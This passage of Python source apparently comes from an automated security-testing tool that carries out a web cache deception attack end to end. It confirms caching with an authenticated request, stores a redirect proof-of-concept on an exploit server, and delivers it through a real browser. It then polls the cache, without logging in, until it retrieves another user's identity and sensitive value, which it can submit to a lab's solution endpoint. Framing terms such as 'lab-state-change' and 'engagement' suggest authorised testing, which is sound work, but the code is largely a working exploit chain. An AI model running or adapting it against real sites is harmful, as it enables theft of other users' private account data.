                second_identity = extract_prefixed_value(second["body"], identity_prefix)
                second_value = extract_prefixed_value(second["body"], value_prefix)
                second_cache = _header_values(second["headers"], cache_header)
                if (
                    second["truncated"]
                    or int(second["status"]) != expected_cache_status
                    or not second_cache
                    or not any(hit_marker.lower() in item.lower() for item in second_cache)
                    or second_identity != own_identity
                    or second_value != own_value
                    or _path_and_query(str(second["wireUrl"])) != preflight_path
                ):
                    raise CacheDeceptionProbeError("authenticated preflight did not transition to a cache hit")
                self._append_evidence(
                    steps,
                    "authenticated-preflight-cache-hit",
                    "GET",
                    preflight_url,
                    "",
                    cookie,
                    authorization,
                    second,
                    secrets_to_redact,
                )

                stored = await self._request(
                    session,
                    "POST",
                    exploit_store_url,
                    body=store_body,
                )
                request_count += 1
                if stored["truncated"] or int(stored["status"]) != 200:
                    raise CacheDeceptionProbeError("generated WCD redirect PoC was not stored")
                self._append_evidence(
                    steps,
                    "exploit-store",
                    "POST",
                    exploit_store_url,
                    store_body,
                    "",
                    "",
                    stored,
                    secrets_to_redact,
                )

                browser_result = await self._browser_deliver(
                    exploit_store_url,
                    str(parameters["exploitActionField"]),
                    str(parameters["exploitDeliverValue"]),
                    timeout,
                )
                delivery_form = parse_qs(
                    str(browser_result["deliveryBody"]),
                    keep_blank_values=True,
                    strict_parsing=True,
                )
                expected_delivery = {
                    **store_form,
                    str(parameters["exploitHeadField"]): canonicalize_form_newlines(RESPONSE_HEAD),
                    str(parameters["exploitBodyField"]): canonicalize_form_newlines(poc_body),
                    str(parameters["exploitActionField"]): str(parameters["exploitDeliverValue"]),
                }
                if (
                    any(delivery_form.get(key) != [value] for key, value in expected_delivery.items())
                    or set(delivery_form) != set(expected_delivery)
                    or browser_result["loadUrl"] != exploit_store_url
                    or browser_result["deliveryUrl"] != exploit_store_url
                    or _origin(str(browser_result["outcomeUrl"])) != _origin(exploit)
                    or int(browser_result["loadResponse"]["status"]) != 200
                    or int(browser_result["deliveryResponse"]["status"]) not in {302, 303}
                    or int(browser_result["outcomeResponse"]["status"]) != 200
                ):
                    raise CacheDeceptionProbeError("real browser delivery did not complete the configured flow")
                request_count += 3
                self._append_evidence(
                    steps,
                    "browser-exploit-load",
                    "GET",
                    exploit_store_url,
                    "",
                    "",
                    "",
                    browser_result["loadResponse"],
                    secrets_to_redact,
                )
                self._append_evidence(
                    steps,
                    "browser-delivery-click",
                    "POST",
                    exploit_store_url,
                    str(browser_result["deliveryBody"]),
                    "",
                    "",
                    browser_result["deliveryResponse"],
                    secrets_to_redact,
                )
                self._append_evidence(
                    steps,
                    "browser-delivery-result",
                    "GET",
                    str(browser_result["outcomeUrl"]),
                    "",
                    "",
                    "",
                    browser_result["outcomeResponse"],
                    secrets_to_redact,
                )

                victim_response: Optional[Dict[str, Any]] = None
                for attempt in range(1, poll_attempts + 1):
                    if attempt > 1:
                        await asyncio.sleep(poll_interval_ms / 1_000)
                    candidate = await self._request(
                        session,
                        "GET",
                        victim_url,
                        encoded_url=True,
                    )
                    request_count += 1
                    victim_fetch_attempts += 1
                    candidate_identity = extract_prefixed_value(candidate["body"], identity_prefix)
                    candidate_value = extract_prefixed_value(candidate["body"], value_prefix)
                    candidate_cache = _header_values(candidate["headers"], cache_header)
                    accepted = (
                        not candidate["truncated"]
                        and int(candidate["status"]) == expected_cache_status
                        and any(hit_marker.lower() in item.lower() for item in candidate_cache)
                        and bool(candidate_identity)
                        and bool(candidate_value)
                        and candidate_identity != own_identity
                        and candidate_value != own_value
                        and _path_and_query(str(candidate["wireUrl"])) == victim_path
                    )
                    candidate_secrets = [
                        *secrets_to_redact,
                        candidate_identity,
                        candidate_value,
                    ]
                    self._append_evidence(
                        steps,
                        f"unauthenticated-victim-cache-fetch-{attempt}",
                        "GET",
                        victim_url,
                        "",
                        "",
                        "",
                        candidate,
                        candidate_secrets,
                    )
                    if accepted:
                        foreign_identity = candidate_identity
                        foreign_value = candidate_value
                        victim_response = candidate
                        secrets_to_redact.extend([foreign_identity, foreign_value])
                        break
                if victim_response is None or not foreign_identity or not foreign_value:
                    raise CacheDeceptionProbeError(
                        "bounded unauthenticated polling did not return a foreign cache hit"
                    )

                if proof_level == "lab-state-change":
                    solution_url = urljoin(target, str(parameters["solutionPath"]))
                    solution_body = urlencode(
                        {str(parameters["solutionField"]): foreign_value}
                    )
                    solution = await self._request(
                        session,
                        "POST",
                        solution_url,
                        body=solution_body,
                    )
                    request_count += 1
                    solution_status = int(solution["status"])
                    if solution["truncated"] or solution_status != int(parameters["expectedSolutionStatus"]):
                        raise CacheDeceptionProbeError("approved solution submission failed")
                    self._append_evidence(
                        steps,
                        "approved-value-linked-solution-submit",
                        "POST",
                        solution_url,
                        solution_body,
                        "",
                        "",
                        solution,
                        secrets_to_redact,
                    )

                    status_url = urljoin(target, str(parameters["statusPath"]))
                    solved_response = await self._request(session, "GET", status_url)
                    request_count += 1
                    solved_status = int(solved_response["status"])
                    if (
                        solved_response["truncated"]
                        or solved_status != int(parameters["expectedSolvedStatus"])
                        or str(parameters["solvedMarker"]) not in solved_response["body"]
                        or str(parameters["unsolvedMarker"]) in solved_response["body"]
                    ):
                        raise CacheDeceptionProbeError("lab did not transition to solved")
                    solved_after = True
                    self._append_evidence(
                        steps,
                        "solved-confirmation",
                        "GET",
                        status_url,
                        "",
                        "",
                        "",
                        solved_response,
                        secrets_to_redact,
                    )
        except Exception as exc:
            return {
                "success": False,
                "fallback": False,
                "error": str(exc)[:500],
                "requestCount": request_count,
                "findings": [],
            }

        assert own_identity and own_value and foreign_identity and foreign_value
        verification = {
            "verified": True,
            "fallback": False,
            "mode": str(parameters["mode"]).lower(),
            "proofLevel": proof_level,
            "target": target,
            "exploitServer": exploit,
            "engagement": str(parameters["engagement"]).lower(),
            "sensitivePath": sensitive_path,
            "staticDirectoryPath": static_directory_path,
            "identityPrefix": identity_prefix,
            "sensitiveValuePrefix": value_prefix,
            "cacheStatusHeader": cache_header,
            "cacheMissMarker": miss_marker,
            "cacheHitMarker": hit_marker,
            "expectedSensitiveStatus": expected_sensitive_status,
            "expectedCacheStatus": expected_cache_status,
            "minimumCacheTtlSeconds": min_ttl,
            "maximumCacheTtlSeconds": max_ttl,
            "observedCacheTtlSeconds": observed_ttl,
            "preflightPath": preflight_path,
            "victimPath": victim_path,
            "victimUrl": victim_url,
            "preflightKeyAuthenticated": True,
            "victimKeyAuthenticated": False,
            "ownIdentitySha256": _sha256(own_identity),
            "ownSensitiveValueSha256": _sha256(own_value),
            "foreignIdentitySha256": _sha256(foreign_identity),
            "foreignSensitiveValueSha256": _sha256(foreign_value),
            "foreignIdentityDistinct": own_identity != foreign_identity,
            "foreignSensitiveValueDistinct": own_value != foreign_value,
            "browserDelivery": True,
            "victimFetchAuthenticated": False,
            "victimFetchCacheHit": True,
            "victimFetchAttempts": victim_fetch_attempts,
            "pollAttempts": poll_attempts,
            "pollIntervalMs": poll_interval_ms,
            "pocSha256": _sha256(poc_body),
            "pocLength": len(poc_body.encode("utf-8")),
            "exploitStorePath": str(parameters["exploitStorePath"]),
            "exploitResourcePath": str(parameters["exploitResourcePath"]),
            "exploitHttpsField": str(parameters["exploitHttpsField"]),
            "exploitFileField": str(parameters["exploitFileField"]),
            "exploitHeadField": str(parameters["exploitHeadField"]),
            "exploitBodyField": str(parameters["exploitBodyField"]),
            "exploitActionField": str(parameters["exploitActionField"]),
            "exploitHttpsValue": str(parameters["exploitHttpsValue"]),
            "exploitStoreValue": str(parameters["exploitStoreValue"]),
            "exploitDeliverValue": str(parameters["exploitDeliverValue"]),
            **(
                {
                    "statusPath": str(parameters["statusPath"]),
                    "unsolvedMarker": str(parameters["unsolvedMarker"]),
                    "solvedMarker": str(parameters["solvedMarker"]),
                    "solutionPath": str(parameters["solutionPath"]),
                    "solutionField": str(parameters["solutionField"]),
                    "expectedStatusStatus": int(parameters["expectedStatusStatus"]),
                    "expectedSolutionStatus": int(parameters["expectedSolutionStatus"]),
                    "expectedSolvedStatus": int(parameters["expectedSolvedStatus"]),
                }
                if proof_level == "lab-state-change"
                else {}
            ),
            "baselineStatus": baseline_status,
            "solutionStatus": solution_status,
            "solvedStatus": solved_status,
            "solvedBefore": solved_before,
            "solvedAfter": solved_after,
            "solutionAnswerSha256": _sha256(foreign_value) if proof_level == "lab-state-change" else None,
            "requestCount": request_count,
            "httpEvidence": {"version": 1, "steps": steps},
        }
        finding = build_nuclei_finding(target, verification)
        return {
            "success": True,
            "fallback": False,
            "target": target,
            "exploitServer": exploit,
            "verification": verification,
            "findings": [finding],
            "summary": {
                "verified": True,
                "mode": verification["mode"],
                "proofLevel": proof_level,
                "browserDelivery": True,
                "victimFetchCacheHit": True,
                "foreignIdentityDistinct": True,
                "foreignSensitiveValueDistinct": True,
                "requestCount": request_count,
                "findingCount": 1,
            },
        }


def get_tool() -> CacheDeceptionProbeTool:
    return CacheDeceptionProbeTool()
